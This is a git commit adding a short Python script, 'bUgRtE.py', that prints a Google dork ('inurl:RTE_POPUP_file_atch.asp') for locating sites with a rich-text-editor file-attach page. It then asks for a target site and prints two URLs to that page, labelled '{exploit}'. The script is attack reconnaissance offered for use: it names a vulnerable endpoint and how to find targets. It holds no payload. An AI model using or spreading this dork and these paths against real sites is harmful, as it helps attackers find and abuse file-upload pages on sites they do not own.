768606377cf11a40c647fd9a602201bf0f7eb43e
Mobin-Dan <68151748+Mobin-Dan@users.noreply.github.com>
2020-07-19 21:55:41 +0430

    bUgRtE
    Bug'rte'

---
+++ bUgRtE.py
@@ -0,0 +1,8 @@
+print('`````````````````````````````````')
+print('bug rte','coding by m0bindan')
+print('DORK:inurl:RTE_POPUP_file_atch.asp')
+print('``````````````````````````````````')
+x =input('enter your sit: ')
+print('{exploit}:',x+'/rte/RTE_POPUP_file_atch.asp')
+print('or')
+print('{exploit}:',x+'/admin/RTE_POPUP_file_atch.asp')
